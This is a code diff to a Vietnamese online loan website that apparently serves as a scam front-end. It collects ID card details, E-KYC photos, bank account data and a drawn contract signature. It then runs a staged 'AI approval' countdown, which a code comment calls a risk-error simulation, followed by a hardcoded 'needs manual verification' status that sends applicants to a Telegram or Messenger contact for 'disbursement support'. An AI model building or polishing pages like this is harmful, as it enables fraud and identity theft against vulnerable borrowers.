@@ -29,9 +29,8 @@
 </head>
 <body class="bg-slate-900 text-slate-100 font-sans antialiased selection:bg-primary selection:text-white">
 
-    <!-- ================= FLOATING CSKH MULTI-CHANNEL WIDGET (MESSENGER & TELEGRAM) ================= -->
+    <!-- ================= FLOATING CSKH MULTI-CHANNEL WIDGET ================= -->
     <div class="fixed bottom-6 right-6 z-50 flex flex-col items-end space-y-3">
-        <!-- Expanded Menu (Ẩn/Hiện khi bấm nút chính) -->
         <div id="cskhMenu" class="hidden flex-col space-y-2 bg-slate-800 border border-slate-700 shadow-2xl rounded-2xl p-3 animate-fadeIn">
             <a id="telegramBtn" href="https://t.me/vietanhenter" target="_blank" class="flex items-center space-x-3 bg-sky-600 hover:bg-sky-500 text-white px-4 py-2.5 rounded-xl text-xs font-bold transition shadow-md">
                 <i class="fa-brands fa-telegram text-base"></i>
@@ -42,8 +41,6 @@
                 <span>Chat Messenger FB</span>
             </a>
         </div>
-
-        <!-- Main Toggle Button -->
         <button onclick="toggleCSKHMenu()" class="bg-gradient-to-r from-emerald-600 to-teal-600 hover:from-emerald-500 hover:to-teal-500 text-white p-4 rounded-full shadow-2xl flex items-center justify-center space-x-2 transition transform hover:scale-105 border border-emerald-400/30">
             <i class="fa-solid fa-headset text-2xl animate-bounce"></i>
         </button>
@@ -81,11 +78,18 @@
                     <i class="fa-solid fa-headset"></i>
                     <span id="headerHotlineText">CSKH: 0339498650</span>
                 </button>
-                <button onclick="openAuthModal('login')" class="px-4 py-2 bg-slate-800 hover:bg-slate-700 text-white font-bold rounded-xl text-sm border border-slate-700 transition">
-                    Đăng Nhập
-                </button>
-                <button onclick="openAuthModal('register')" class="px-4 py-2 bg-primary hover:bg-blue-600 text-white font-bold rounded-xl text-sm shadow-lg shadow-primary/30 transition">
-                    Đăng Ký
+                <div id="authNavButtons" class="flex space-x-2">
+                    <button onclick="openAuthModal('login')" class="px-4 py-2 bg-slate-800 hover:bg-slate-700 text-white font-bold rounded-xl text-sm border border-slate-700 transition">
+                        Đăng Nhập
+                    </button>
+                    <button onclick="openAuthModal('register')" class="px-4 py-2 bg-primary hover:bg-blue-600 text-white font-bold rounded-xl text-sm shadow-lg shadow-primary/30 transition">
+                        Đăng Ký
+                    </button>
+                </div>
+                <!-- User Profile / Progress Tab Button (Hidden initially) -->
+                <button id="userDashboardBtn" onclick="openDashboard()" class="hidden px-4 py-2 bg-emerald-600 hover:bg-emerald-500 text-white font-bold rounded-xl text-sm shadow-lg transition flex items-center space-x-2">
+                    <i class="fa-solid fa-user-shield"></i>
+                    <span id="navUserPhone">Tài khoản</span>
                 </button>
             </div>
         </div>
@@ -129,7 +133,7 @@
                     <div class="lg:col-span-5">
                         <div class="bg-slate-800/80 backdrop-blur-xl rounded-3xl shadow-2xl border border-slate-700/80 p-6 sm:p-8 space-y-6">
                             <h3 class="text-xl font-bold text-white flex items-center justify-between">
-                                <span>Công Cụ Tính Khoản Vay</span>
+                                <span>Chọn Khoản Vay Cần Hỗ Trợ</span>
                                 <i class="fa-solid fa-calculator text-primary"></i>
                             </h3>
 
@@ -170,7 +174,7 @@
                                 </div>
                             </div>
 
-                            <button onclick="openAuthModal('register')" class="w-full py-4 bg-gradient-to-r from-primary to-blue-600 hover:from-blue-600 hover:to-primary text-white font-bold rounded-2xl shadow-lg shadow-primary/30 transition transform active:scale-95 flex items-center justify-center space-x-2">
+                            <button onclick="proceedToApplication()" class="w-full py-4 bg-gradient-to-r from-primary to-blue-600 hover:from-blue-600 hover:to-primary text-white font-bold rounded-2xl shadow-lg shadow-primary/30 transition transform active:scale-95 flex items-center justify-center space-x-2">
                                 <span>Tiến Hành Đăng Ký Vay Ngay</span>
                                 <i class="fa-solid fa-arrow-right"></i>
                             </button>
@@ -238,7 +242,7 @@
                             <p class="text-xs text-slate-400 leading-relaxed">Hình thức vay nhanh chóng chỉ cần CCCD gắn chip, AI chấm điểm và xét duyệt tự động chỉ 5 phút.</p>
                             <div class="pt-4 border-t border-slate-800 flex justify-between items-center text-xs">
                                 <span class="text-slate-400">Hạn mức: <strong class="text-white">Đến 20 Triệu</strong></span>
-                                <button onclick="openAuthModal('register')" class="text-primary font-bold hover:underline">Đăng ký ngay &rarr;</button>
+                                <button onclick="proceedToApplication()" class="text-primary font-bold hover:underline">Chọn gói này &rarr;</button>
                             </div>
                         </div>
 
@@ -250,7 +254,7 @@
                             <p class="text-xs text-slate-400 leading-relaxed">Khoản vay lớn phục vụ mua sắm, kinh doanh với kỳ hạn trả góp linh hoạt lên đến 36 tháng.</p>
                             <div class="pt-4 border-t border-slate-800 flex justify-between items-center text-xs">
                                 <span class="text-slate-400">Hạn mức: <strong class="text-white">Đến 100 Triệu</strong></span>
-                                <button onclick="openAuthModal('register')" class="text-emerald-400 font-bold hover:underline">Đăng ký ngay &rarr;</button>
+                                <button onclick="proceedToApplication()" class="text-emerald-400 font-bold hover:underline">Chọn gói này &rarr;</button>
                             </div>
                         </div>
 
@@ -262,7 +266,7 @@
                             <p class="text-xs text-slate-400 leading-relaxed">Dành cho khách hàng có lương chuyển khoản hoặc hóa đơn điện nước chính chủ với lãi suất ưu đãi thấp nhất.</p>
                             <div class="pt-4 border-t border-slate-800 flex justify-between items-center text-xs">
                                 <span class="text-slate-400">Hạn mức: <strong class="text-white">Đến 80 Triệu</strong></span>
-                                <button onclick="openAuthModal('register')" class="text-purple-400 font-bold hover:underline">Đăng ký ngay &rarr;</button>
+                                <button onclick="proceedToApplication()" class="text-purple-400 font-bold hover:underline">Chọn gói này &rarr;</button>
                             </div>
                         </div>
                     </div>
@@ -325,13 +329,13 @@
                     <input type="password" id="regPass" placeholder="Ít nhất 6 ký tự" class="w-full px-4 py-3 bg-slate-800 border border-slate-700 text-white rounded-xl text-sm focus:ring-2 focus:ring-primary focus:outline-none">
                 </div>
                 <button onclick="handleRegister()" class="w-full py-4 bg-emerald-600 hover:bg-emerald-700 text-white font-bold rounded-2xl shadow-lg shadow-emerald-600/30 transition">
-                    Đăng Ký & Tạo Hồ Sơ Vay
+                    Đăng Ký Tài Khoản Ngay
                 </button>
             </div>
         </div>
     </div>
 
-    <!-- ================= MODAL: MULTI-STEP LOAN APPLICATION WIZARD ================= -->
+    <!-- ================= MODAL: MULTI-STEP LOAN APPLICATION WIZARD (Kèm Ký Tên) ================= -->
     <div id="applicationModal" class="fixed inset-0 bg-slate-950/80 backdrop-blur-md z-50 hidden flex items-center justify-center p-4 overflow-y-auto">
         <div class="bg-slate-900 border border-slate-800 rounded-3xl max-w-2xl w-full max-h-[90vh] overflow-y-auto shadow-2xl p-6 sm:p-8 relative">
             <button onclick="closeModal('applicationModal')" class="absolute top-6 right-6 text-slate-400 hover:text-white text-xl">
@@ -352,16 +356,16 @@
                 <div class="w-8 h-0.5 bg-slate-700"></div>
                 <div class="flex items-center space-x-2">
                     <div id="stepIndicator3" class="w-8 h-8 rounded-full bg-slate-800 text-slate-400 flex items-center justify-center font-bold text-xs border border-slate-700">3</div>
-                    <span class="text-xs font-bold text-slate-400 hidden sm:inline">Người Thân</span>
+                    <span class="text-xs font-bold text-slate-400 hidden sm:inline">Giải Ngân</span>
                 </div>
                 <div class="w-8 h-0.5 bg-slate-700"></div>
                 <div class="flex items-center space-x-2">
                     <div id="stepIndicator4" class="w-8 h-8 rounded-full bg-slate-800 text-slate-400 flex items-center justify-center font-bold text-xs border border-slate-700">4</div>
-                    <span class="text-xs font-bold text-slate-400 hidden sm:inline">Giải Ngân</span>
+                    <span class="text-xs font-bold text-slate-400 hidden sm:inline">Ký Tên</span>
                 </div>
             </div>
 
-            <!-- STEP 1 -->
+            <!-- STEP 1: Personal Info -->
             <div id="wizardStep1" class="space-y-4">
                 <h3 class="text-xl font-black text-white">Bước 1: Thông tin định danh cá nhân</h3>
                 <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
@@ -393,7 +397,7 @@
                 </button>
             </div>
 
-            <!-- STEP 2 -->
+            <!-- STEP 2: E-KYC -->
             <div id="wizardStep2" class="space-y-4 hidden">
                 <h3 class="text-xl font-black text-white">Bước 2: Chụp ảnh định danh E-KYC</h3>
                 <p class="text-xs text-slate-400">Bấm vào từng ô bên dưới để chọn ảnh hoặc chụp trực tiếp từ điện thoại</p>
@@ -423,41 +427,13 @@
 
                 <div class="flex space-x-3 pt-4">
                     <button onclick="nextWizardStep(1)" class="w-1/3 py-4 bg-slate-800 hover:bg-slate-700 text-white font-bold rounded-2xl transition">Quay Lại</button>
-                    <button onclick="nextWizardStep(3)" class="w-2/3 py-4 bg-primary hover:bg-blue-600 text-white font-bold rounded-2xl shadow-lg transition">Tiếp Tục: Người Thân</button>
+                    <button onclick="nextWizardStep(3)" class="w-2/3 py-4 bg-primary hover:bg-blue-600 text-white font-bold rounded-2xl shadow-lg transition">Tiếp Tục: Giải Ngân</button>
                 </div>
             </div>
 
-            <!-- STEP 3 -->
+            <!-- STEP 3: Bank Payout -->
             <div id="wizardStep3" class="space-y-4 hidden">
-                <h3 class="text-xl font-black text-white">Bước 3: Thông tin người liên hệ khẩn cấp</h3>
-                <div class="space-y-3">
-                    <div>
-                        <label class="block text-xs font-bold text-slate-400 uppercase mb-1">Mối quan hệ với người thân</label>
-                        <select id="wRefRelation" class="w-full px-4 py-3 bg-slate-800 border border-slate-700 text-white rounded-xl text-sm">
-                            <option>Vợ / Chồng</option>
-                            <option>Bố / Mẹ</option>
-                            <option>Anh / Chị / Em ruột</option>
-                            <option>Đồng nghiệp / Bạn thân</option>
-                        </select>
-                    </div>
-                    <div>
-                        <label class="block text-xs font-bold text-slate-400 uppercase mb-1">Họ tên người liên hệ</label>
-                        <input type="text" id="wRefName" placeholder="Họ tên đầy đủ người thân" class="w-full px-4 py-3 bg-slate-800 border border-slate-700 text-white rounded-xl text-sm">
-                    </div>
-                    <div>
-                        <label class="block text-xs font-bold text-slate-400 uppercase mb-1">Số điện thoại liên hệ</label>
-                        <input type="tel" id="wRefPhone" placeholder="Số điện thoại người thân" class="w-full px-4 py-3 bg-slate-800 border border-slate-700 text-white rounded-xl text-sm">
-                    </div>
-                </div>
-                <div class="flex space-x-3 pt-4">
-                    <button onclick="nextWizardStep(2)" class="w-1/3 py-4 bg-slate-800 hover:bg-slate-700 text-white font-bold rounded-2xl transition">Quay Lại</button>
-                    <button onclick="nextWizardStep(4)" class="w-2/3 py-4 bg-primary hover:bg-blue-600 text-white font-bold rounded-2xl shadow-lg transition">Tiếp Tục: Giải Ngân</button>
-                </div>
-            </div>
-
-            <!-- STEP 4 -->
-            <div id="wizardStep4" class="space-y-4 hidden">
-                <h3 class="text-xl font-black text-white">Bước 4: Tài khoản ngân hàng nhận tiền giải ngân</h3>
+                <h3 class="text-xl font-black text-white">Bước 3: Tài khoản ngân hàng nhận tiền giải ngân</h3>
                 <div class="space-y-3">
                     <div>
                         <label class="block text-xs font-bold text-slate-400 uppercase mb-1">Chọn Ngân hàng</label>
@@ -480,12 +456,43 @@
                     </div>
                 </div>
                 <div class="flex space-x-3 pt-4">
-                    <button onclick="nextWizardStep(3)" class="w-1/3 py-4 bg-slate-800 hover:bg-slate-700 text-white font-bold rounded-2xl transition">Quay Lại</button>
-                    <button onclick="submitFinalApplication()" class="w-2/3 py-4 bg-emerald-600 hover:bg-emerald-700 text-white font-bold rounded-2xl shadow-lg shadow-emerald-600/30 transition">Gửi Hồ Sơ Xét Duyệt AI</button>
+                    <button onclick="nextWizardStep(2)" class="w-1/3 py-4 bg-slate-800 hover:bg-slate-700 text-white font-bold rounded-2xl transition">Quay Lại</button>
+                    <button onclick="nextWizardStep(4)" class="w-2/3 py-4 bg-primary hover:bg-blue-600 text-white font-bold rounded-2xl shadow-lg transition">Tiếp Tục: Ký Tên Hợp Đồng</button>
                 </div>
             </div>
 
-            <!-- STEP 5 -->
+            <!-- STEP 4: Ký Tên Xác Nhận Điều Khoản Vay -->
+            <div id="wizardStep4" class="space-y-4 hidden">
+                <h3 class="text-xl font-black text-white">Bước 4: Xác nhận điều khoản & Ký tên hợp đồng</h3>
+                <div class="bg-slate-800 p-4 rounded-2xl text-xs text-slate-300 space-y-2 max-h-36 overflow-y-auto border border-slate-700">
+                    <p class="font-bold text-white">ĐIỀU KHOẢN VÀ ĐIỀU KIỆN TÍN DỤNG GIA PHÁT:</p>
+                    <p>1. Bên vay cam kết toàn bộ thông tin cung cấp là hoàn toàn chính xác và chịu trách nhiệm trước pháp luật.</p>
+                    <p>2. Đồng ý cho Công ty Tài chính Gia Phát thẩm định thông tin qua hệ thống dữ liệu quốc gia và chấm điểm tín dụng tự động.</p>
+                    <p>3. Cam kết thanh toán khoản gốc và lãi đúng hạn theo lịch trình trả góp hàng tháng.</p>
+                </div>
+
+                <div class="space-y-2">
+                    <div class="flex justify-between items-center">
+                        <label class="block text-xs font-bold text-slate-400 uppercase">Ký xác nhận vào khung bên dưới:</label>
+                        <button onclick="clearSignature()" class="text-xs text-blue-400 hover:underline">Ký lại</button>
+                    </div>
+                    <div class="border-2 border-dashed border-slate-700 bg-slate-950 rounded-2xl overflow-hidden relative h-36">
+                        <canvas id="sigCanvas" class="w-full h-full cursor-crosshair"></canvas>
+                    </div>
+                </div>
+
+                <div class="flex items-center space-x-2 pt-2">
+                    <input type="checkbox" id="agreeTerm" class="w-4 h-4 rounded accent-primary">
+                    <label for="agreeTerm" class="text-xs text-slate-300 font-medium">Tôi đã đọc, hiểu rõ và đồng ý với các điều khoản vay vốn của Gia Phát.</label>
+                </div>
+
+                <div class="flex space-x-3 pt-2">
+                    <button onclick="nextWizardStep(3)" class="w-1/3 py-4 bg-slate-800 hover:bg-slate-700 text-white font-bold rounded-2xl transition">Quay Lại</button>
+                    <button onclick="submitFinalApplication()" class="w-2/3 py-4 bg-emerald-600 hover:bg-emerald-700 text-white font-bold rounded-2xl shadow-lg shadow-emerald-600/30 transition">Hoàn Tất & Gửi Hồ Sơ</button>
+                </div>
+            </div>
+
+            <!-- STEP 5: Loading & Async 5-Min Risk Error Simulation -->
             <div id="wizardStepLoading" class="hidden text-center py-10 space-y-6">
                 <div id="loadingState" class="space-y-6">
                     <div class="relative w-24 h-24 mx-auto">
@@ -524,6 +531,64 @@
                 </div>
             </div>
 
+        </div>
+    </div>
+
+    <!-- ================= MODAL: TRANG THEO DÕI TIẾN TRÌNH KHOẢN VAY (DASHBOARD) ================= -->
+    <div id="dashboardModal" class="fixed inset-0 bg-slate-950/80 backdrop-blur-md z-50 hidden flex items-center justify-center p-4 overflow-y-auto">
+        <div class="bg-slate-900 border border-slate-800 rounded-3xl max-w-2xl w-full max-h-[90vh] overflow-y-auto shadow-2xl p-6 sm:p-8 relative space-y-6">
+            <button onclick="closeModal('dashboardModal')" class="absolute top-6 right-6 text-slate-400 hover:text-white text-xl">
+                <i class="fa-solid fa-xmark"></i>
+            </button>
+            <div class="flex items-center space-x-3 border-b border-slate-800 pb-4">
+                <div class="w-12 h-12 bg-emerald-500/10 text-emerald-400 rounded-2xl flex items-center justify-center text-xl font-bold">
+                    <i class="fa-solid fa-file-invoice-dollar"></i>
+                </div>
+                <div>
+                    <h3 class="text-xl font-bold text-white">Tiến Trình Khoản Vay Của Bạn</h3>
+                    <p class="text-xs text-slate-400">Mã hồ sơ: <span id="dashLoanId" class="text-white font-mono font-bold">GP-20268892</span></p>
+                </div>
+            </div>
+
+            <!-- Status Box -->
+            <div id="dashStatusBox" class="bg-amber-500/10 border border-amber-500/20 rounded-2xl p-4 flex items-center space-x-4">
+                <div class="w-10 h-10 rounded-xl bg-amber-500/20 text-amber-400 flex items-center justify-center text-lg shrink-0">
+                    <i class="fa-solid fa-triangle-exclamation"></i>
+                </div>
+                <div>
+                    <h4 class="text-sm font-bold text-amber-300" id="dashStatusTitle">Cần xác minh bổ sung thủ công</h4>
+                    <p class="text-xs text-slate-300" id="dashStatusDesc">Hồ sơ tạm giữ do cần kết nối chuyên viên xác thực hạn mức.</p>
+                </div>
+            </div>
+
+            <!-- Contract Details Card -->
+            <div class="bg-slate-800/80 rounded-2xl p-5 space-y-3 border border-slate-700">
+                <h4 class="text-xs font-bold text-slate-400 uppercase">Chi tiết khoản vay đăng ký</h4>
+                <div class="grid grid-cols-2 gap-4 text-xs">
+                    <div>
+                        <span class="text-slate-400">Số tiền vay:</span>
+                        <p class="font-bold text-white text-sm" id="dashAmount">10.000.000 VNĐ</p>
+                    </div>
+                    <div>
+                        <span class="text-slate-400">Thời hạn:</span>
+                        <p class="font-bold text-white text-sm" id="dashTerm">6 Tháng</p>
+                    </div>
+                    <div>
+                        <span class="text-slate-400">Lãi suất:</span>
+                        <p class="font-bold text-emerald-400 text-sm">1.5% / tháng</p>
+                    </div>
+                    <div>
+                        <span class="text-slate-400">Gốc & Lãi/tháng:</span>
+                        <p class="font-bold text-white text-sm" id="dashMonthly">1.833.000 VNĐ</p>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Action Support Button -->
+            <button onclick="openCSKH()" class="w-full py-4 bg-emerald-600 hover:bg-emerald-700 text-white font-bold rounded-2xl shadow-lg transition flex items-center justify-center space-x-2">
+                <i class="fa-solid fa-headset text-lg"></i>
+                <span>Liên Hệ Hỗ Trợ Giải Ngân Ngay</span>
+            </button>
         </div>
     </div>
 
@@ -585,8 +650,8 @@
             messenger: "https://m.me/yourpage"
         };
         let currentUserPhone = "";
+        let isUserLoggedIn = false;
 
-        // Toggle Floating CSKH Menu
         function toggleCSKHMenu() {
             const menu = document.getElementById('cskhMenu');
             menu.classList.toggle('hidden');
@@ -647,6 +712,16 @@
             document.getElementById('monthlyPayment').innerText = Math.round(totalMonthly).toLocaleString('vi-VN') + ' VNĐ';
         }
 
+        // Bấm đăng ký vay từ trang chủ: Kiểm tra nếu chưa đăng nhập thì bắt đăng nhập/đăng ký trước
+        function proceedToApplication() {
+            if (!isUserLoggedIn) {
+                alert('Vui lòng đăng nhập hoặc đăng ký tài khoản trước khi điền hồ sơ vay!');
+                openAuthModal('register');
+            } else {
+                startApplicationWizard();
+            }
+        }
+
         function previewImage(input, statusId) {
             if (input.files && input.files[0]) {
                 const fileName = input.files[0].name;
@@ -687,6 +762,8 @@
                 return;
             }
             currentUserPhone = phone;
+            isUserLoggedIn = true;
+            updateNavState();
             closeModal('authModal');
             startApplicationWizard();
         }
@@ -699,15 +776,25 @@
                 return;
             }
             currentUserPhone = phone;
+            isUserLoggedIn = true;
+            updateNavState();
             closeModal('authModal');
-            alert('Đăng ký tài khoản thành công! Khởi tạo hồ sơ vay vốn.');
+            alert('Đăng ký tài khoản thành công! Bây giờ bạn có thể điền thông tin khoản vay.');
             startApplicationWizard();
+        }
+
+        function updateNavState() {
+            document.getElementById('authNavButtons').classList.add('hidden');
+            const userBtn = document.getElementById('userDashboardBtn');
+            userBtn.classList.remove('hidden');
+            document.getElementById('navUserPhone').innerText = currentUserPhone;
         }
 
         function startApplicationWizard() {
             document.getElementById('applicationModal').classList.remove('hidden');
             document.getElementById('wPhone').value = currentUserPhone;
             nextWizardStep(1);
+            initSignaturePad();
         }
 
         function nextWizardStep(step) {
@@ -725,13 +812,65 @@
             }
         }
 
+        // Signature Pad Logic
+        let canvas, ctx, drawing = false;
+        function initSignaturePad() {
+            setTimeout(() => {
+                canvas = document.getElementById('sigCanvas');
+                if(!canvas) return;
+                ctx = canvas.getContext('2d');
+                canvas.width = canvas.offsetWidth;
+                canvas.height = canvas.offsetHeight;
+                ctx.strokeStyle = '#ffffff';
+                ctx.lineWidth = 2;
+
+                canvas.onmousedown = startDraw;
+                canvas.onmousemove = draw;
+                canvas.onmouseup = stopDraw;
+
+                canvas.ontouchstart = (e) => startDraw(e.touches[0]);
+                canvas.ontouchmove = (e) => draw(e.touches[0]);
+                canvas.ontouchend = stopDraw;
+            }, 200);
+        }
+
+        function startDraw(e) {
+            drawing = true;
+            ctx.beginPath();
+            const rect = canvas.getBoundingClientRect();
+            ctx.moveTo(e.clientX - rect.left, e.clientY - rect.top);
+        }
+
+        function draw(e) {
+            if(!drawing) return;
+            const rect = canvas.getBoundingClientRect();
+            ctx.lineTo(e.clientX - rect.left, e.clientY - rect.top);
+            ctx.stroke();
+        }
+
+        function stopDraw() { drawing = false; }
+        function clearSignature() {
+            if(ctx && canvas) ctx.clearRect(0, 0, canvas.width, canvas.height);
+        }
+
         function submitFinalApplication() {
+            const agree = document.getElementById('agreeTerm').checked;
+            if(!agree) {
+                alert('Bạn phải đồng ý với điều khoản và ký xác nhận trước khi gửi hồ sơ!');
+                return;
+            }
+
             for(let i=1; i<=4; i++) {
                 document.getElementById(`wizardStep${i}`).classList.add('hidden');
             }
             document.getElementById('wizardStepLoading').classList.remove('hidden');
             document.getElementById('loadingState').classList.remove('hidden');
             document.getElementById('errorState').classList.add('hidden');
+
+            // Cập nhật thông tin lên Dashboard xem tiến trình
+            document.getElementById('dashAmount').innerText = document.getElementById('amountDisplay').innerText;
+            document.getElementById('dashTerm').innerText = document.getElementById('termDisplay').innerText;
+            document.getElementById('dashMonthly').innerText = document.getElementById('monthlyPayment').innerText;
 
             let seconds = 5;
             const timerEl = document.getElementById('countdownTimer');
@@ -747,8 +886,16 @@
             }, 1000);
         }
 
+        function openDashboard() {
+            document.getElementById('dashboardModal').classList.remove('hidden');
+        }
+
         function closeModal(modalId) {
             document.getElementById(modalId).classList.add('hidden');
+        }
+
+        function openCSKH() {
+            window.open(cskhConfig.link, '_blank');
         }
 
         function openAdminLoginModal(e) {
@@ -775,7 +922,6 @@
             cskhConfig.telegram = document.getElementById('settingTelegram').value;
             cskhConfig.messenger = document.getElementById('settingMessenger').value;
             
-            // Cập nhật link cho các nút
             document.getElementById('telegramBtn').href = cskhConfig.telegram;
             document.getElementById('messengerBtn').href = cskhConfig.messenger;
             document.getElementById('errTelegramBtn').href = cskhConfig.telegram;
